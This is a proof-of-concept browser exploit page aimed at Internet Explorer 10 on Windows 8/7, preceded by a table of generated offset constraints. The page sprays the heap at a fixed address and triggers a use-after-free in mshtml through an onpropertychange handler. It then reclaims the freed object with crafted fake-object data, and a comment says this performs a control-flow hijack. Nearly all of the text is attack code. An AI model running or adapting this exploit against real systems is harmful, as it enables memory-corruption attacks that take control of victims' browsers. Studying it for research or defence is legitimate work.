===========base: 0xcfffff88L============
+--------+----------------+
| offset |      data      |
+--------+----------------+
| 0x78L  |    min:0x0     |
|        | max:0xffffffff |
+--------+----------------+
| 0x7cL  |    min:0x0     |
|        | max:0xffffffff |
+--------+----------------+
| 0xacL  |      0x0       |
+--------+----------------+
| 0x160L |    min:0x0     |
|        | max:0xffffffff |
+--------+----------------+

<!DOCTYPE HTML>
<!--

    WORKING ON WIN8.0 64-bit IE10 (vanilla install)
    jscript9 + mshtml.dll version 10.0.9200.16834
    successfully tested on Win7

-->
<html>
<body>
<div id=content></div>
<button onclick=run()>runme</button>
<script>
    var g_arr = [];
    var arrLen = 0x250;

    function dword2data(dword)
    {
      var d = Number(dword).toString(16);
      while (d.length < 8)
        d = '0' + d;

      return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
    }

    function eXpl()
    {
      var a=0;

      for (a=0; a < arrLen; a++) {
          g_arr[a] = document.createElement('div');
      }

      var b = dword2data(ATTACKER_CONTROLLED_REGION + 7);

      /* initial attacker controlled buffer, address unknown */
      while (b.length < 0x360) {
//--- GENERATED PART START ---
if (b.length == (0x78/2)) { b += dword2data(ATTACKER_CONTROLLED_REGION+0x110+3);} // offset=0x78L disp=0x78L
else if (b.length == (0x160/2)) {b += dword2data(ATTACKER_CONTROLLED_REGION+0x110+3);} // offset=0x160L disp=0x160L
else if (b.length == (0x7c/2)) {b += dword2data(ATTACKER_CONTROLLED_REGION+0x110+3);} // offset=0x7cL disp=0x7cL
else if (b.length == (0xac/2)) {b += dword2data(0x0);} // offset=0xacL disp=0xacL
else { b += dword2data(ATTACKER_CONTROLLED_REGION+0x7); }
//--- GENERATED PART END ---
      }

      var d = b.substring(0, ( 0x340 - 2 )/2);

      try{
        this.outerHTML=this.outerHTML
      } catch(e){

      }

      CollectGarbage();

      for (a=0; a < arrLen; a++)
        {
          g_arr[a].title = d.substring(0, d.length);
        }
    }

    function trigger()
    {
        var a = document.getElementsByTagName("script");
        var b = a[0];
        b.onpropertychange = eXpl;
        var c = document.createElement('SELECT');
        c = b.appendChild(c);
    }

/* stores a pointer disaligned in two integers in native int encoding  */
/* bit 9 must be set due to native int encoding limitations */
function convertAddress(address) {
	if (address & 0x100 == 0)
		alert("Warning: Impossible address!");

	part0 = ((address & 0xff) << 24) >> 1;
	part1 = ((address & 0xffffff00) >> 8) >> 1;
	
	return [part0, part1];
}
	
function run(){
    ATTACKER_CONTROLLED_REGION = 0x14140000 // backed by heap spray

    targetAddr = 0x14140000 // heap spray target address
    nrArrays = 0x1000
    arrSize =  (0x10000-0x20-0x1000)/4
    var arr = new Array(nrArrays)
    intArrBuf = new ArrayBuffer(0x2f4)
    k = 0
    while(k < nrArrays){
        arr[k] = new Array(arrSize);
        for(var i= 0; i<0x55; i++){
            arr[k][i] = new Uint8Array(intArrBuf, 0, 1);
        }

//--- GENERATED PART START ---
arr[k][arrSize - 1] = 0x12121212;

        k += 1;
//--- GENERATED PART END ---
    }


    // perform control-flow hijack
    trigger()
}

</script>
</body>
</html>
